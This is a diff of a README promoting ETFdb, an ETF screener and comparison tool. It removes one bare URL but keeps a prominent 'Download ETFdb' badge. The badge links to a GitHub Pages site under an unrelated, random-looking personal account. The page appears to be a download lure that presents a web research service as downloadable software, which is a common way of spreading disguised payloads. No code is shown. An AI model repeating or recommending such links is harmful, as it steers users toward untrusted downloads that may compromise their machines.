@@ -30,7 +30,6 @@ The ETFdb ETF screener is useful when an investor starts with a market idea but 
 ETFdb compare tools then support a deeper decision. Investors can evaluate ETFdb holdings, costs, liquidity, category fit, and strategy overlap. When two ETFs look similar by name, ETFdb ETF comparison context can reveal meaningful differences in index methodology, concentration, and expense structure.
 
 ## Download and Visual Preview
-https://onalsezek25659.github.io/.github/etfdb-etf-database
 [![Download ETFdb](https://img.shields.io/badge/Download-ETFdb-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://onalsezek25659.github.io/.github/etfdb-etf-database)
 
 ![ETFdb dashboard showing ETF screener filters comparison panels and holdings research](https://yt3.googleusercontent.com/sLuolUPEga3b-wi2oyUPa4vSMyeUGZbD1cP5Je6uRXspylFJaGOQAuCfRiUsU2xuxfNq4Lpu=w1060-fcrop64=1,00005a57ffffa5a8-k-c0xffffffff-no-nd-rj)
